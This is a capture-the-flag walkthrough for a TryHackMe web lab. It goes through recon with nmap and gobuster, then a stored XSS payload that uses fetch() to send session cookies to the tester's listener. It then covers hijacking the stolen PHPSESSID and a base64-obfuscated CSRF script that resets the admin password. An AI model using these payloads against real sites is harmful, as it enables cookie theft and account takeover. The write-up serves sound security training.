# What's your name?

---

## Table of Contents

* [1. Add Target to `/etc/hosts`](#1-add-target-to-etchosts)
* [2. Scan the Target](#2-scan-the-target)
* [3. Enumerate the Web Servers](#3-enumerate-the-web-servers)
* [4. Start an HTTP Listener](#4-start-an-http-listener)
* [5. Register an Account](#5-register-an-account)
* [6. Configure `login.worldwap.thm`](#6-configure-loginworldwapthm)
* [7. Enumerate the Login Application](#7-enumerate-the-login-application)
* [8. Investigate Session Handling](#8-investigate-session-handling)
* [9. Investigate Password Change](#9-investigate-password-change)
* [10. Test CSRF](#10-test-csrf)
* [11. Attack Path Summary](#11-attack-path-summary)

---

# 1. Add Target to `/etc/hosts`

First, add the target hostname to the local hosts file.

```bash
sudo nano /etc/hosts
```

Add:

```text
10.49.180.59    worldwap.thm
```

Save the file and verify the hostname:

```bash
getent hosts worldwap.thm
```

---

# 2. Scan the Target

Run an Nmap scan to identify open ports and service versions:

```bash
nmap -sC -sV -Pn worldwap.thm
```

The scan identifies web services running on:

```text
80/tcp
8081/tcp
```

---

# 3. Enumerate the Web Servers

Open the discovered web services in a browser:

```text
http://worldwap.thm
```

and:

```text
http://worldwap.thm:8081
```

Inspect both applications and note any interesting functionality.

---
# 4. Start an HTTP Listener

Create a working directory:

```bash
mkdir -p ~/worldwap
cd ~/worldwap
```

Start a Python HTTP server:

```bash
python3 -m http.server 8000 --bind 0.0.0.0
```

Expected output:

```text
Serving HTTP on 0.0.0.0 port 8000
```

---
# 5. Test XSS

Find the IP address assigned to the TryHackMe VPN interface:

```bash
ip addr
```

Look for the `tun0` interface.

Example:

```text
tun0
inet 10.x.x.x
```
Navigate to:

```text
http://worldwap.thm/public/html/register.php
```

Register with credentials:

```text
Username: test
Password: test
Email: test@mail.com
Name:
```
In the `Name` field paste the payload:
```
<img src="empty.png" onerror="fetch('http://YOUR-LOCALHOST-IP:8000/?cookie1='+document.cookie);"/>
```
and replace YOUR-LOCALHOST-IP with your IP.

Keep the credentials available for testing the login functionality.

Return to the HTTP Listener you will see the PHPSESSID being captured.
---
# 6. Configure `login.worldwap.thm`

Edit the hosts file:

```bash
sudo nano /etc/hosts
```

Add the login application hostname:

```text
10.49.174.251    worldwap.thm   login.worldwap.thm
```

Verify the hostname:

```bash
getent hosts login.worldwap.thm
```

---

# 7. Enumerate the Login Application

Use Gobuster to enumerate directories and files:

```bash
gobuster dir \
-u http://login.worldwap.thm/ \
-w /usr/share/wordlists/dirb/common.txt \
-x php,html,txt,js,bak,old
```

The important endpoint discovered during enumeration is:

```text
/login.php
```

Open:

```text
http://login.worldwap.thm/login.php
```

---

# 8. Investigate Session Handling

Attempt to log in using the test credentials created earlier.

The application returns:

```text
Incorrect username or password
```

Use the browser Developer Tools to inspect the application's cookies.

Look for:

```text
PHPSESSID
```

### Procedure

1. Open Developer Tools.
2. Navigate to **Application/Storage**.
3. Locate the cookies for `login.worldwap.thm`.
4. Find the `PHPSESSID` cookie.
5. Replace its value with the captured lab session value.
6. Refresh the page.

The session manipulation results in access to:

```text
/profile.php
```

Open:

```text
http://login.worldwap.thm/profile.php
```

---

# 9. Investigate Password Change

From the profile page, locate the **Change Password** functionality.

Enter a test password and intercept the request using **Burp Suite**.

Inspect the request in:

```text
Proxy → HTTP history
```

Identify the password parameter:

```text
new_password
```

The relevant endpoint is:

```text
/change_password.php
```

Record the request structure for further testing.

---

# 10. Test CSRF

The password-change functionality can be tested for Cross-Site Request Forgery (CSRF).

The relevant request contains:

```text
action=execute&new_password=password
```

The lab procedure uses JavaScript to send a request to:

```text
/change_password.php
```

Click `Go to chat` and send the payload:

```
<script>
        var xhr = new XMLHttpRequest();
        xhr.open('POST', atob('aHR0cDovL2xvZ2luLndvcmxkd2FwLnRobS9jaGFuZ2VfcGFzc3dvcmQucGhw'), true);
        xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.onreadystatechange = function () {
            if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
                alert("Action executed!");
            }
        };
        xhr.send('action=execute&new_password=password');
</script>
```
When the request is executed successfully in the vulnerable lab context, the expected response is:

```text
Action executed!
```

After execution, verify whether the password was actually changed.

---
# 11. Login as Admin

On another private window open:
```text
http://login.worldwap.thm/login.php
```
And login with the credenetials
```
username: Admin
password: password
```

---

# 12. Attack Path Summary

The investigation can be organized as follows:

```text
                         WorldWAP
                            |
          +-----------------+-----------------+
          |                                   |
     Main Website                        Login Website
          |                                   |
      /public                             login.php
          |                                   |
        /html                         Session Handling
          |                                   |
     upload.php                          profile.php
                                              |
                                       Change Password
                                              |
                                             CSRF
          |
         /api
```

---

## Tools Used

| Tool                    | Purpose                                |
| ----------------------- | -------------------------------------- |
| Nmap                    | Port and service enumeration           |
| Gobuster                | Directory/file enumeration             |
| FFUF                    | Web fuzzing and enumeration            |
| Burp Suite              | HTTP interception and request analysis |
| Browser Developer Tools | Cookie/session inspection              |
| Python HTTP Server      | Local HTTP listener                    |
| Kali Linux              | Security testing environment           |

---

## Key Findings

The investigation identified the following areas of interest:

1. **Web service enumeration**
2. **Separate login application**
3. **PHP session handling**
4. **Profile functionality**
5. **Password-change functionality**
6. **Potential CSRF vulnerability**
7. **File-upload functionality**
8. **API endpoints**
9. **Directory and file exposure**

---

## Disclaimer

This walkthrough is intended for educational purposes and authorized security-testing environments such as TryHackMe.

Do not perform these techniques against systems, applications, accounts, or networks without explicit authorization.

---